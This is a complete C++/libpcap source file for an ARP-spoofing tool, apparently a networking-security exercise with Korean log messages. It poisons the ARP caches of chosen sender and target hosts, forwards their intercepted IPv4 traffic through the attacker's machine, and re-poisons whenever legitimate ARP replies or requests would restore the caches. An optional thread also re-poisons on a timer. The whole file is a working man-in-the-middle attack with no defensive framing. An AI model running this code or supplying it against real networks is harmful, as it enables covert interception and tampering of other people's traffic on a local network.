#include <bits/stdc++.h>
#include <arpa/inet.h>
#include <sys/ioctl.h>
#include <net/if.h>
#include <unistd.h>
#include <pcap.h>
#include "ethhdr.h"
#include "arphdr.h"
using namespace std;

#define ENABLE_PERIODIC_REINFECTION 0
#define REINFECTION_PERIOD 10

#pragma pack(push, 1)
struct EthArpPacket final {
    EthHdr eth_;
    ArpHdr arp_;
};
#pragma pack(pop)

struct IpHdr final {
    uint8_t vhl, tos;
    uint16_t len, id, off;
    uint8_t ttl, p;
    uint16_t sum;
    uint32_t sip_, dip_;

    Ip sip() const { return Ip(ntohl(sip_)); }
    Ip dip() const { return Ip(ntohl(dip_)); }
};

struct Session {
    Ip sender_ip;
    Ip target_ip;
    Mac sender_mac;
    Mac target_mac;
};

void usage() {
    printf("syntax : arp-spoofing <interface> <sender ip> <target ip> [<sender ip 2> <target ip 2> ...]\n");
    printf("sample : arp-spoofing wlan0 192.168.10.2 192.168.10.1\n");
}

string get_local_mac(const string& name) {
    ifstream mac_file("/sys/class/net/" + name + "/address");
    if (!mac_file.is_open()) {
        perror("MAC file open error");
        exit(-1);
    }
    string res;
    mac_file >> res;
    return res;
}

string get_local_ip(const string& name) {
    int fd = socket(AF_INET, SOCK_DGRAM, 0);
    if (fd == -1) {
        perror("Socket open error");
        exit(-1);
    }
    ifreq ifr;
    ifr.ifr_addr.sa_family = AF_INET;
    strncpy(ifr.ifr_name, name.c_str(), IFNAMSIZ - 1);
    if (ioctl(fd, SIOCGIFADDR, &ifr) < 0) {
        perror("ioctl error");
        exit(-1);
    }
    sockaddr_in* sock_in = (sockaddr_in*)&ifr.ifr_addr;
    return inet_ntoa(sock_in->sin_addr);
}

EthArpPacket build_arp_packet(const Mac& eth_smac, const Mac& eth_dmac,
                              const Mac& arp_smac, const Mac& arp_tmac,
                              const Ip& sip, const Ip& tip,
                              bool is_request) {
    EthArpPacket packet;
    packet.eth_.smac_ = eth_smac;
    packet.eth_.dmac_ = eth_dmac;
    packet.eth_.type_ = htons(EthHdr::Arp);

    packet.arp_.hrd_ = htons(ArpHdr::ETHER);
    packet.arp_.pro_ = htons(EthHdr::Ip4);
    packet.arp_.hln_ = Mac::Size;
    packet.arp_.pln_ = Ip::Size;
    packet.arp_.op_ = htons(is_request ? ArpHdr::Request : ArpHdr::Reply);
    packet.arp_.smac_ = arp_smac;
    packet.arp_.tmac_ = arp_tmac;
    packet.arp_.sip_ = htonl(sip);
    packet.arp_.tip_ = htonl(tip);
    return packet;
}

bool inject_arp_packet(pcap_t* handle, const EthArpPacket& packet) {
    return pcap_sendpacket(handle, reinterpret_cast<const u_char*>(&packet), sizeof(EthArpPacket)) == 0;
}

Mac resolve_mac_via_arp(pcap_t* handle, const string& local_mac, const string& local_ip, const string& target_ip) {
    Mac broadcast("ff:ff:ff:ff:ff:ff");
    Mac null_mac("00:00:00:00:00:00");

    EthArpPacket req = build_arp_packet(
        Mac(local_mac), broadcast,
        Mac(local_mac), null_mac,
        Ip(local_ip), Ip(target_ip),
        true
    );

    inject_arp_packet(handle, req);

    while (true) {
        struct pcap_pkthdr* header;
        const u_char* pkt;
        int res = pcap_next_ex(handle, &header, &pkt);
        if (res == 0) continue;
        if (res == PCAP_ERROR || res == PCAP_ERROR_BREAK) break;

        EthHdr* eth = (EthHdr*)pkt;
        if (ntohs(eth->type_) != EthHdr::Arp) continue;

        ArpHdr* arp = (ArpHdr*)(pkt + sizeof(EthHdr));
        if (ntohs(arp->op_) != ArpHdr::Reply) continue;
        if (ntohl(arp->sip_) != Ip(target_ip)) continue;
        if (ntohl(arp->tip_) != Ip(local_ip)) continue;

        return arp->smac();
    }

    fprintf(stderr, "ARP reply not received for %s\n", target_ip.c_str());
    exit(-1);
}

struct MonitorArgs {
    pcap_t* handle;
    vector<Session>* sessions;
    Mac local_mac;
};

void* periodic_spoof_monitor(void* arg) {
    MonitorArgs* args = (MonitorArgs*)arg;
    while (true) {
        sleep(REINFECTION_PERIOD);
        for (const auto& sess : *(args->sessions)) {
            EthArpPacket reinfect = build_arp_packet(
                args->local_mac, sess.sender_mac,
                args->local_mac, sess.sender_mac,
                sess.target_ip, sess.sender_ip,
                false
            );
            inject_arp_packet(args->handle, reinfect);
            std::cout << "[*] Periodic Reinfected: sender " << string(sess.sender_ip)
                      << " -> target " << string(sess.target_ip) << std::endl;
        }
    }
    return nullptr;
}

int main(int argc, char* argv[]) {
    if (argc < 4 || (argc % 2 != 0)) {
        usage();
        return EXIT_FAILURE;
    }

    char* dev = argv[1];
    string local_mac = get_local_mac(dev);
    string local_ip = get_local_ip(dev);

    char errbuf[PCAP_ERRBUF_SIZE];
    pcap_t* handle = pcap_open_live(dev, 65535, 1, 1, errbuf);
    if (handle == nullptr) {
        fprintf(stderr, "couldn't open device %s(%s)\n", dev, errbuf);
        return EXIT_FAILURE;
    }

    vector<Session> sessions;
    for (int i = 2; i + 1 < argc; i += 2) {
        string ip1 = argv[i];
        string ip2 = argv[i + 1];

        Session sess1{Ip(ip1), Ip(ip2), resolve_mac_via_arp(handle, local_mac, local_ip, ip1), resolve_mac_via_arp(handle, local_mac, local_ip, ip2)};
        inject_arp_packet(handle, build_arp_packet(Mac(local_mac), sess1.sender_mac, Mac(local_mac), sess1.sender_mac, sess1.target_ip, sess1.sender_ip, false));
        sessions.push_back(sess1);

        Session sess2{Ip(ip2), Ip(ip1), sess1.target_mac, sess1.sender_mac};
        inject_arp_packet(handle, build_arp_packet(Mac(local_mac), sess2.sender_mac, Mac(local_mac), sess2.sender_mac, sess2.target_ip, sess2.sender_ip, false));
        sessions.push_back(sess2);
    }

#if ENABLE_PERIODIC_REINFECTION
    MonitorArgs* args = new MonitorArgs{handle, &sessions, Mac(local_mac)};
    pthread_t tid;
    pthread_create(&tid, nullptr, periodic_spoof_monitor, args);
#endif

    while (true) {
        struct pcap_pkthdr* header;
        const u_char* packet;
        int res = pcap_next_ex(handle, &header, &packet);
        if (res == 0) continue;
        if (res == PCAP_ERROR || res == PCAP_ERROR_BREAK) break;

        EthHdr* eth = (EthHdr*)packet;

        if (ntohs(eth->type_) == EthHdr::Ip4) {
            IpHdr* ip = (IpHdr*)(packet + sizeof(EthHdr));
            for (auto& sess : sessions) {
                if (ip->sip() == sess.sender_ip && ip->dip() == sess.target_ip) {
                    eth->smac_ = Mac(local_mac);
                    eth->dmac_ = sess.target_mac;
                    pcap_sendpacket(handle, packet, header->caplen);
                } else if (ip->sip() == sess.target_ip && ip->dip() == sess.sender_ip) {
                    eth->smac_ = Mac(local_mac);
                    eth->dmac_ = sess.sender_mac;
                    pcap_sendpacket(handle, packet, header->caplen);
                } else if (ip->sip() == sess.sender_ip && ip->dip() != sess.target_ip && ip->dip() != Ip(local_ip)) {
                    eth->smac_ = Mac(local_mac);
                    eth->dmac_ = sess.target_mac;
                    pcap_sendpacket(handle, packet, header->caplen);
                } else if (ip->dip() == sess.sender_ip && ip->sip() != sess.target_ip) {
                    eth->smac_ = Mac(local_mac);
                    eth->dmac_ = sess.sender_mac;
                    pcap_sendpacket(handle, packet, header->caplen);
                }
            }
        } else if (ntohs(eth->type_) == EthHdr::Arp) {
            ArpHdr* arp = (ArpHdr*)(packet + sizeof(EthHdr));
            uint16_t op = ntohs(arp->op_);
            Ip sip = Ip(ntohl(arp->sip_));
            Ip tip = Ip(ntohl(arp->tip_));
            Mac smac = arp->smac_;

            for (auto& sess : sessions) {
                if (op == ArpHdr::Reply && sip == sess.target_ip && tip == sess.sender_ip && smac != Mac(local_mac)) {
                    std::cout << "[!] ARP Reply 감지 (복구 의심): " << string(sip) << " -> " << string(tip) << ", MAC: " << string(smac) << std::endl;
                    EthArpPacket reinfect = build_arp_packet(Mac(local_mac), sess.sender_mac, Mac(local_mac), sess.sender_mac, sess.target_ip, sess.sender_ip, false);
                    inject_arp_packet(handle, reinfect);
                    std::cout << "[*] 재감염 전송 완료 (Reply 기반)" << std::endl;
                } else if (op == ArpHdr::Request && sip == sess.sender_ip && tip == sess.target_ip) {
                    std::cout << "[!] ARP Request 감지: " << string(sip) << " -> " << string(tip) << std::endl;
                    EthArpPacket reinfect = build_arp_packet(Mac(local_mac), sess.sender_mac, Mac(local_mac), sess.sender_mac, sess.target_ip, sess.sender_ip, false);
                    inject_arp_packet(handle, reinfect);
                    std::cout << "[*] 재감염 전송 완료 (Request 기반)" << std::endl;
                }
            }
        }
    }

    pcap_close(handle);
    return 0;
}
